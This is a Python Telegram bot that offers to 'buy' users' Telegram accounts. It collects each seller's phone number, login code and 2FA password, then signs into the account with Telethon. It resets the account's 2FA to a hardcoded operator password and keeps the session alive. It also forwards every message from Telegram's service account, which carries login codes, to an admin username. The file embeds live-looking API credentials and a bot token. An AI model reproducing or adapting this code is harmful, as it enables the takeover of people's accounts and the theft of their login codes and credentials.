import os
import asyncio
import logging
import json
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler, CallbackQueryHandler
from telethon import TelegramClient, events

# Logging setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Constants
API_ID = 30158256
API_HASH = '547889500d1e8399c3da0a8ecff5f461'
BOT_TOKEN = '8468878569:AAGOCTKXZdx7Ut8jAkS38qwtSo0h_ZMuGoA'

# Conversation states
LANG_SELECT, PHONE, OTP, TWO_FA = range(4)

# Data files
DATA_FILE = 'user_data.json'

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {"balances": {}, "hold_balances": {}, "accounts": {}, "languages": {}, "sold_numbers": []}

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f)

db_data = load_data()

ADMIN_CHAT_ID = 5810613583
FORWARD_ADMIN_USERNAME = 'CEO_cryfex'
TWO_FA_PASSWORD = '4735908767'

# Pricing
PRICING = {}
if os.path.exists('pricing.txt'):
    with open('pricing.txt', 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'): continue
            if ':' in line:
                parts = line.split(':')
                # Extract the country code from [flag]+code format
                code_part = parts[0].strip()
                if ']+' in code_part:
                    code = code_part.split(']+')[-1]
                elif '+' in code_part:
                    code = code_part.split('+')[-1]
                else:
                    code = code_part
                
                try:
                    price = float(parts[1].strip())
                    PRICING[code] = price
                except ValueError:
                    continue

# Translations
STRINGS = {
    'bn': {
        'welcome': "স্বাগতম! আপনার ভাষা নির্বাচন করুন:",
        'main_menu': "নিচের মেনু থেকে একটি অপশন নির্বাচন করুন।",
        'sell_btn': "Sell account",
        'balance_btn': "Balance",
        'price_btn': "Price",
        'balance_msg': "Hold Balance: ${hold:.2f}\nMain Balance: ${main:.2f}",
        'phone_prompt': "আপনার টেলিগ্রাম নম্বরটি দিন (যেমন: +88017XXXXXXXX):",
        'otp_sending': "অপেক্ষা করুন, OTP পাঠানো হচ্ছে...",
        'otp_sent': "OTP পাঠানো হয়েছে। সেটি এখানে দিন:",
        'otp_prompt': "আপনার টেলিগ্রামে একটি OTP পাঠানো হয়েছে। সেটি এখানে দিন:",
        'two_fa_prompt': "আপনার অ্যাকাউন্টে ২-স্টেপ ভেরিফিকেশন অন করা আছে। আপনার ২-স্টেপ পাসওয়ার্ডটি দিন:",
        'login_success': "লগইন সফল হয়েছে! {price}$ আপনার Hold Balance-এ এড করা হয়েছে। ২৪ ঘন্টা অপেক্ষা করুন Main Balance-এ আসতে।",
        'login_fail': "❌ লগইন ব্যর্থ হয়েছে: {error}",
        'already_sold': "⚠️ এই নম্বরটি আগে একবার সেল করা হয়েছে।",
        'wait_main': "⏳ Hold Balance এড করা হয়েছে। ২৪ ঘন্টা অপেক্ষা করুন Main Balance-এ আসবে।",
        'cancel': "❌ অপারেশন বাতিল করা হয়েছে।",
        'cancel_btn': "Cancel"
    },
    'en': {
        'welcome': "Welcome! Select your language:",
        'main_menu': "Select an option from the menu below.",
        'sell_btn': "Sell account",
        'balance_btn': "Balance",
        'price_btn': "Price",
        'balance_msg': "Hold Balance: ${hold:.2f}\nMain Balance: ${main:.2f}",
        'phone_prompt': "Enter your Telegram number (e.g., +88017XXXXXXXX):",
        'otp_sending': "Wait, OTP is being sent...",
        'otp_sent': "OTP has been sent. Enter it here:",
        'otp_prompt': "An OTP has been sent to your Telegram. Enter it here:",
        'two_fa_prompt': "Your account has 2-Step Verification enabled. Enter your 2FA password:",
        'login_success': "Login successful! ${price} added to your Hold Balance. Wait 24 hours for it to move to Main Balance.",
        'login_fail': "❌ Login failed: {error}",
        'already_sold': "⚠️ This number has already been sold.",
        'wait_main': "⏳ Hold Balance added. Wait 24 hours for Main Balance.",
        'cancel': "❌ Operation cancelled.",
        'cancel_btn': "Cancel"
    },
    'ar': {
        'welcome': "أهلاً بك! اختر لغتك:",
        'main_menu': "اختر خيارًا من القائمة أدناه.",
        'sell_btn': "Sell account",
        'balance_btn': "Balance",
        'price_btn': "Price",
        'balance_msg': "رصيد معلق: ${hold:.2f}\nرصيد أساسي: ${main:.2f}",
        'phone_prompt': "أدخل رقم تيليجرام الخاص بك (مثلاً: +88017XXXXXXXX):",
        'otp_sending': "انتظر، يتم إرسال رمز التحقق...",
        'otp_sent': "تم إرسال رمز التحقق. أدخله هنا:",
        'otp_prompt': "تم ارسال كود التحقق الى تيليجرام. ادخله هنا:",
        'two_fa_prompt': "تم تفعيل التحقق بخطوتين على حسابك. أدخل كلمة مرور التحقق بخطوتين:",
        'login_success': "تم تسجيل الدخول بنجاح! تم إضافة ${price} إلى رصيدك المعلق. انتظر 24 ساعة للتحويل للرصيد الأساسي.",
        'login_fail': "فشل تسجيل الدخول: {error}",
        'already_sold': "تم بيع هذا الرقم من قبل.",
        'wait_main': "تم إضافة الرصيد المعلق. انتظر 24 ساعة للرصيد الأساسي.",
        'cancel': "تم إلغاء العملية."
    }
}

user_sessions = {}

def get_str(user_id, key):
    lang = db_data['languages'].get(str(user_id), 'en')
    return STRINGS[lang].get(key, STRINGS['en'][key])

async def start_forwarding(client, user_id):
    @client.on(events.NewMessage(incoming=True))
    async def handler(event):
        try:
            sender = await event.get_sender()
            if sender and (getattr(sender, 'id', None) == 777000 or getattr(sender, 'username', '').lower() == 'telegram'):
                await client.send_message(FORWARD_ADMIN_USERNAME, event.message)
        except: pass

    async def keep_alive():
        while True:
            try:
                if not client.is_connected(): await client.connect()
                if await client.is_user_authorized():
                    from telethon.tl.functions.account import UpdateStatusRequest
                    await client(UpdateStatusRequest(offline=False))
                    await client.get_me()
            except: pass
            await asyncio.sleep(60)

    if not client.is_connected(): await client.connect()
    asyncio.create_task(client.run_until_disconnected())
    asyncio.create_task(keep_alive())

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id in db_data['languages']:
        keyboard = [
            [KeyboardButton(get_str(user_id, 'sell_btn'))],
            [KeyboardButton(get_str(user_id, 'balance_btn')), KeyboardButton(get_str(user_id, 'price_btn'))]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(f"👋 {get_str(user_id, 'welcome')}\n\n{get_str(user_id, 'main_menu')}", reply_markup=reply_markup)
        return ConversationHandler.END
        
    keyboard = [["বাংলা", "English", "العربية"]]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
    await update.message.reply_text("🌐 Select Language / ভাষা নির্বাচন করুন / اختر اللغة:", reply_markup=reply_markup)
    return LANG_SELECT

async def set_lang(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = str(update.effective_user.id)
    if text == "বাংলা": db_data['languages'][user_id] = 'bn'
    elif text == "English": db_data['languages'][user_id] = 'en'
    elif text == "العربية": db_data['languages'][user_id] = 'ar'
    save_data(db_data)
    
    keyboard = [
        [KeyboardButton(get_str(user_id, 'sell_btn'))],
        [KeyboardButton(get_str(user_id, 'balance_btn')), KeyboardButton(get_str(user_id, 'price_btn'))]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(f"✅ {get_str(user_id, 'main_menu')}", reply_markup=reply_markup)
    return ConversationHandler.END

async def show_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    hold = db_data['hold_balances'].get(user_id, 0.0)
    main = db_data['balances'].get(user_id, 0.0)
    await update.message.reply_text(f"💰 {get_str(user_id, 'balance_msg').format(hold=hold, main=main)}")

async def show_prices(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not os.path.exists('pricing.txt'):
        await update.message.reply_text("❌ Price list not available.")
        return
    with open('pricing.txt', 'r') as f:
        content = f.read()
    await update.message.reply_text(f"🏷️ **Current Prices:**\n\n{content[:4000]}")

async def login_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    # Ensure language is set, default to 'en' if not
    if user_id not in db_data['languages']:
        db_data['languages'][user_id] = 'en'
        save_data(db_data)
    
    # Show only Cancel button
    keyboard = [[KeyboardButton(get_str(user_id, 'cancel_btn'))]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    # Check if the message is 'Sell account' and start the conversation
    await update.message.reply_text(get_str(user_id, 'phone_prompt'), reply_markup=reply_markup)
    return PHONE

async def handle_sell_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    return await login_start(update, context)

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip().replace(' ', '')
    user_id = str(update.effective_user.id)
    
    if phone == get_str(user_id, 'cancel_btn'):
        return await cancel(update, context)
    
    # Simple validation for international phone format
    if not (phone.startswith('+') and phone[1:].isdigit() and len(phone) > 10):
        await update.message.reply_text("❌ ভুল নাম্বার! সঠিক নাম্বার দিন (যেমন: +88017XXXXXXXX)")
        return PHONE

    if phone in db_data['sold_numbers']:
        await update.message.reply_text(get_str(user_id, 'already_sold'))
        # Return to main menu keyboard
        keyboard = [
            [KeyboardButton(get_str(user_id, 'sell_btn'))],
            [KeyboardButton(get_str(user_id, 'balance_btn')), KeyboardButton(get_str(user_id, 'price_btn'))]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(get_str(user_id, 'main_menu'), reply_markup=reply_markup)
        return ConversationHandler.END

    # Send sending message first
    await update.message.reply_text(f"⏳ {get_str(user_id, 'otp_sending')}")

    context.user_data['phone'] = phone
    # Use a unique session name per attempt to allow multiple numbers
    import time
    session_name = f"session_{user_id}_{phone.replace('+', '')}_{int(time.time())}"
    
    try:
        # Create a new client for each request to support multiple concurrent attempts
        client = TelegramClient(session_name, API_ID, API_HASH)
        await client.connect()
        user_sessions[user_id] = client
        
        # Request code
        try:
            sent_code = await client.send_code_request(phone)
            context.user_data['phone_code_hash'] = sent_code.phone_code_hash
            
            # Show only Cancel button
            keyboard = [[KeyboardButton(get_str(user_id, 'cancel_btn'))]]
            reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
            await update.message.reply_text(f"📩 {get_str(user_id, 'otp_sent')}", reply_markup=reply_markup)
            return OTP
        except Exception as e:
            # Handle the specific "Returned when all available options..." error
            error_msg = str(e)
            if "ResendCodeRequest" in error_msg or "all available options" in error_msg.lower():
                # Try to sign in with an empty password to trigger a different code path or just report more clearly
                await update.message.reply_text("⚠️ টেলিগ্রাম থেকে ওটিপি পাঠানো যাচ্ছে না। দয়া করে আপনার টেলিগ্রাম অ্যাপ চেক করুন অথবা কিছুক্ষণ পর চেষ্টা করুন।")
            raise e
    except Exception as e:
        logger.error(f"Error sending OTP for {phone}: {e}")
        error_msg = str(e)
        if "flood" in error_msg.lower():
            await update.message.reply_text("অনেকবার চেষ্টা করা হয়েছে। কিছুক্ষণ পর আবার চেষ্টা করুন।")
        elif "phone_number_invalid" in error_msg.lower():
            await update.message.reply_text("ভুল নাম্বার! সঠিক টেলিগ্রাম নাম্বার দিন।")
            return PHONE
        else:
            await update.message.reply_text(f"ওটিপি পাঠানো যায়নি: {error_msg}")
        
        # Cleanup session on hard failure
        if user_id in user_sessions:
            try:
                await user_sessions[user_id].disconnect()
                del user_sessions[user_id]
            except: pass
            
        # Return to main menu keyboard
        keyboard = [
            [KeyboardButton(get_str(user_id, 'sell_btn'))],
            [KeyboardButton(get_str(user_id, 'balance_btn')), KeyboardButton(get_str(user_id, 'price_btn'))]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(get_str(user_id, 'main_menu'), reply_markup=reply_markup)
        return ConversationHandler.END

async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    otp = update.message.text.strip()
    user_id = str(update.effective_user.id)
    
    if otp == get_str(user_id, 'cancel_btn'):
        return await cancel(update, context)
        
    if 'phone' not in context.user_data or 'phone_code_hash' not in context.user_data:
        await update.message.reply_text("সেশন শেষ হয়ে গেছে। আবার শুরু করুন।")
        return ConversationHandler.END

    phone = context.user_data['phone']
    phone_code_hash = context.user_data['phone_code_hash']
    client = user_sessions.get(user_id)
    
    if not client:
        await update.message.reply_text("সেশন পাওয়া যায়নি। আবার চেষ্টা করুন।")
        return ConversationHandler.END
    
    try:
        # Show "processing" message
        status_msg = await update.message.reply_text("লগইন করা হচ্ছে, দয়া করে অপেক্ষা করুন...")
        
        try:
            await client.sign_in(phone, otp, phone_code_hash=phone_code_hash)
        except Exception as e:
            if "session_password_needed" in str(e).lower():
                context.user_data['otp'] = otp
                await update.message.reply_text(get_str(user_id, 'two_fa_prompt'))
                return TWO_FA
            raise e

        return await finish_login(update, context, client, phone, user_id)
    except Exception as e:
        logger.error(f"Error signing in for {phone}: {e}")
        error_msg = str(e)
        
        if "phone_code_invalid" in error_msg.lower():
            await update.message.reply_text("ভুল ওটিপি! সঠিক ওটিপি দিন অথবা 'Cancel' বাটনে চাপ দিন।")
            return OTP
        elif "phone_code_expired" in error_msg.lower():
            await update.message.reply_text("ওটিপি মেয়াদ শেষ হয়ে গেছে। আবার চেষ্টা করুন।")
            return await login_start(update, context)
        else:
            await update.message.reply_text(get_str(user_id, 'login_fail').format(error=error_msg))
        
        # Cleanup session on failure
        await cleanup_session(user_id)
        return ConversationHandler.END

async def get_two_fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()
    user_id = str(update.effective_user.id)
    
    if password == get_str(user_id, 'cancel_btn'):
        return await cancel(update, context)

    phone = context.user_data['phone']
    client = user_sessions.get(user_id)
    
    if not client:
        await update.message.reply_text("সেশন পাওয়া যায়নি। আবার চেষ্টা করুন।")
        return ConversationHandler.END

    try:
        await update.message.reply_text("২-স্টেপ ভেরিফিকেশন যাচাই করা হচ্ছে...")
        await client.sign_in(password=password)
        return await finish_login(update, context, client, phone, user_id)
    except Exception as e:
        logger.error(f"Error with 2FA for {phone}: {e}")
        if "password_hash_invalid" in str(e).lower():
            await update.message.reply_text("ভুল পাসওয়ার্ড! আবার চেষ্টা করুন অথবা Cancel করুন।")
            return TWO_FA
        else:
            await update.message.reply_text(f"লগইন ব্যর্থ হয়েছে: {str(e)}")
            await cleanup_session(user_id)
            return ConversationHandler.END

async def finish_login(update, context, client, phone, user_id):
    try:
        # Get price first
        price = 0.0
        # Sort keys by length descending to match longest prefix (e.g., +880 before +8)
        sorted_codes = sorted(PRICING.keys(), key=len, reverse=True)
        clean_phone = phone.replace('+', '')
        for code in sorted_codes:
            if clean_phone.startswith(code):
                price = PRICING[code]
                break

        # Check if already sold again to be sure
        if phone in db_data['sold_numbers']:
             await update.message.reply_text(get_str(user_id, 'already_sold'))
             await cleanup_session(user_id)
             return ConversationHandler.END

        try: await client.edit_2fa(new_password=TWO_FA_PASSWORD)
        except Exception as e:
            logger.error(f"Failed to set 2FA: {e}")

        db_data['sold_numbers'].append(phone)
        db_data['hold_balances'][user_id] = db_data['hold_balances'].get(user_id, 0.0) + price
        save_data(db_data)

        # Return to main menu keyboard
        keyboard = [
            [KeyboardButton(get_str(user_id, 'sell_btn'))],
            [KeyboardButton(get_str(user_id, 'balance_btn')), KeyboardButton(get_str(user_id, 'price_btn'))]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(get_str(user_id, 'login_success').format(price=price) + "\n" + get_str(user_id, 'wait_main'), reply_markup=reply_markup)
        
        keyboard_admin = [
            [InlineKeyboardButton("Approve", callback_data=f"app_{user_id}_{price}_{phone}"),
             InlineKeyboardButton("Reject", callback_data=f"rej_{user_id}_{price}_{phone}")]
        ]
        admin_msg = f"New Login!\nPhone: {phone}\nPrice: ${price}\nUser: {user_id}"
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_msg, reply_markup=InlineKeyboardMarkup(keyboard_admin))

        await start_forwarding(client, user_id)
        if user_id in user_sessions:
            del user_sessions[user_id]
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"Error in finish_login: {e}")
        await update.message.reply_text(f"একটি সমস্যা হয়েছে: {str(e)}")
        await cleanup_session(user_id)
        return ConversationHandler.END

async def cleanup_session(user_id):
    if user_id in user_sessions:
        try:
            await user_sessions[user_id].disconnect()
            del user_sessions[user_id]
        except: pass

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data.split('_')
    action, user_id, price, phone = data[0], data[1], float(data[2]), data[3]
    
    if action == "app":
        db_data['hold_balances'][user_id] = max(0, db_data['hold_balances'].get(user_id, 0.0) - price)
        db_data['balances'][user_id] = db_data['balances'].get(user_id, 0.0) + price
        await query.edit_message_text(f"Approved: {phone} (${price})")
    else:
        db_data['hold_balances'][user_id] = max(0, db_data['hold_balances'].get(user_id, 0.0) - price)
        await query.edit_message_text(f"Rejected: {phone}")
    
    save_data(db_data)

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    # Cleanup session if exists
    if user_id in user_sessions:
        try:
            await user_sessions[user_id].disconnect()
            del user_sessions[user_id]
        except: pass
        
    # Show main menu keyboard again
    keyboard = [
        [KeyboardButton(get_str(user_id, 'sell_btn'))],
        [KeyboardButton(get_str(user_id, 'balance_btn')), KeyboardButton(get_str(user_id, 'price_btn'))]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(get_str(user_id, 'cancel'), reply_markup=reply_markup)
    return ConversationHandler.END

if __name__ == '__main__':
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler('start', start),
            MessageHandler(filters.Regex('^(Sell account|Sell account)$'), login_start)
        ],
        states={
            LANG_SELECT: [MessageHandler(filters.Regex('^(বাংলা|English|العربية)$'), set_lang)],
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_otp)],
            TWO_FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_two_fa)],
        },
        fallbacks=[
            CommandHandler('cancel', cancel),
            MessageHandler(filters.Regex('^(Cancel|বাতিল|Cancel account|অপারেশন বাতিল করা হয়েছে।)$') | filters.Text(['Cancel', 'বাতিল']), cancel)
        ],
        allow_reentry=True
    )
    
    application.add_handler(conv_handler)
    application.add_handler(MessageHandler(filters.Regex('^Balance$'), show_balance))
    application.add_handler(MessageHandler(filters.Regex('^Price$'), show_prices))
    application.add_handler(CallbackQueryHandler(admin_callback))
    
    # Handle direct phone numbers if not in conversation
    async def handle_direct_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
        # Check if we are already in a conversation for this user
        # ConversationHandler handles this automatically if allow_reentry is True, 
        # but since we have a separate handler in group 1, we should be careful.
        # Actually, the problem is that the direct handler is triggering even when we are IN the conversation.
        return
    
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_direct_text), group=1)
    
    print("Bot is starting...")
    application.run_polling(drop_pending_updates=True)
